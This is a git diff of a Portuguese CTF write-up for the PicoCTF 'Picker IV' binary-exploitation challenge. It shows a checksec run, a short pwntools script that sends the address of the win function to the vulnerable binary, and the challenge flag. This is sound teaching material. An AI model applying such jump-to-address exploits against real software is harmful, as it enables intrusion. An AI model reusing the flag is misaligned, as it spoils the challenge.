@@ -1,14 +1,17 @@
 # Picker IV
 ## Descrição do Desafio:
-Author: LT 'syreal' Jones \
-Plataforma: [PicoCTF](https://play.picoctf.org/practice/challenge/403?category=6&page=1) \
-Categoria: Binary Exploitation \
-Dificuldade: Média \
-Descrição:
+**Autor**: LT 'syreal' Jones \
+**Plataforma**: [PicoCTF](https://play.picoctf.org/practice/challenge/403?category=6&page=1) \
+**Categoria**: Binary Exploitation \
+**Dificuldade**: Média \
+**Descrição**:
 > Can you figure out how this program works to get the flag?
 ## Passo a Passo da Solução:
 ### 1. Análise do arquivo fornecido
-Este desafio facilita muito a vida, porque ele fornece o arquivo fonte junto com o binário ao invés de somente o binário. Analisando o arquivo fonte, podemos ver que existe uma função para imprimir a flag, e que a função principal chama uma função com o endereço do nosso input.
+Este desafio facilita muito a vida, porque ele fornece o arquivo fonte junto com o binário ao invés de somente o binário. Analisando o arquivo fonte, podemos ver que existe uma função para imprimir a **flag**, e que a função principal chama uma função com o endereço do nosso *input*.
+
+{% code title="vuln.c" overflow="wrap" lineNumbers="true" %}
+
 ```c
 #include <stdio.h>
 #include <stdlib.h>
@@ -60,6 +63,9 @@ int main() {
   foo();
 }
 ```
+
+{% endcode %}
+
 Agora que sabemos a provável forma de resolver esse desafio, devemos verificar se há alguma proteção que possa dificultar nossa vida:
 ```bash
 checksec --file=picker-IV
@@ -69,7 +75,10 @@ Partial RELRO   No canary found   NX enabled    No PIE          No RPATH   No RU
 No caso, a única proteção que iria de fato dificultar nossa vida seria a `PIE`, porque com ela os endereços do binários seriam aleatórios todo vez que executássemos o arquivo, porém como a `PIE` está desabilitada o endereço será o mesmo para qualquer máquina que executar o binário.
 
 ### 2. Solução
-Para a solução basta pegar o endereço da função `win` e passar ele no input omitindo o `0x`. Com o pwntools isso fica super simples.
+Para a solução basta pegar o endereço da função `win` e passar ele no *input* omitindo o `0x`. Com o **pwntools** isso fica super simples.
+
+{% code title="solve.py" overflow="wrap" lineNumbers="true" %}
+
 ```py
 from pwn import *
 
@@ -81,6 +90,9 @@ win = elf.symbols["win"]
 p.sendlineafter(b": ", hex(win)[2:])
 print(p.recvall().decode())
 ```
+
+{% endcode %}
+
 ### Flag
 `picoCTF{n3v3r_jump_t0_u53r_5uppl13d_4ddr35535_b8de1af4}`
 
